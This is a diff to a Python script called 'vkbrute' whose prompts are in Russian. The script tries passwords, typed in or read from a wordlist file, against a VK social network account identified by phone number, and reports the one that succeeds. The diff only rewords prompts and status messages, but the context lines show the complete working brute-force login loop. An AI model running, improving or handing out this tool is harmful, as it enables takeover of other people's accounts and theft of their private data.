@@ -8,7 +8,7 @@ logo = ('''
 print(logo)
 
 def wordvvod():
-    words = list(map(str, input("Слова для брута(разделяй запятой(, )): ").split(', ')))
+    words = list(map(str, input("Слова для брута(разделяйте запятой(, )): ").split(', ')))
     for password in words:
         try:
             vk_session = vk_api.VkApi(phone, str(password))
@@ -16,7 +16,7 @@ def wordvvod():
             print(Fore.GREEN +"FOUND: " + str(password))
             break
         except:
-            print(Fore.RED + str(password) + ' BAD')
+            print(Fore.RED + str(password) + ' NOT FOUND')
 
 def wordtxt():
     with open(txt) as f:
@@ -29,16 +29,16 @@ def wordtxt():
             print(Fore.GREEN +"FOUND: " + str(password))
             break
         except:
-            print(Fore.RED + str(password) + ' BAD')
+            print(Fore.RED + str(password) + ' NOT FOUND')
     f.close()
 
 if __name__ == '__main__':
-    phone = input('Телефон (Можно с +): ')
+    phone = input('Телефон: ')
     word = input('Откуда берём слова?: \n[1] - Записываем тут\n[2] - Из txt файла(Словаря)\n'+ Fore.RED +'vkbrute -> ')
     if word == "1":
         wordvvod()
     elif word == "2":
-        txt = input('Ведите название файла(Словаря)(example.txt): ')
+        txt = input('Ведите название файла(example.txt): ')
         wordtxt()
     else:
         print('Повторите попытку')
